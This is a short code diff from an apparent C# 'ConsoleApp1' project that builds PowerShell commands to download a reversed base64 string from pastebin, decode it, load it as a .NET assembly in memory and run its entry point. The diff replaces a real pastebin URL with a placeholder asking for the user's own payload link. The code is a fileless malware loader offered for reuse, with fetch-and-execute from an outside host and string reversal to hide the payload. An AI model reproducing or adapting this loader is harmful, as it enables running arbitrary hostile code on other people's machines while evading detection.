@@ -16,7 +16,7 @@ namespace ConsoleApp1
             {  
                 "Sleep -Seconds 3",
                 "$web = New-Object System.Net.WebClient;",
-                "$string = $web.Downloadstring('https://pastebin.com/raw/BgXHM86K');", // payload base 64!!
+                "$string = $web.Downloadstring('PASTEBIN LINK FOR YOUR BASE 64 STRINGS PAYLOAD');", // payload base 64!!
                 "$assembly = [AppDomain]::CurrentDomain.Load([Convert]::Frombase64String(-join $string[-1..-$string.Length]));",
                 "$methodInfo = $assembly.EntryPoint;",
                 "$create = $assembly.CreateInstance($methodInfo.Name);",
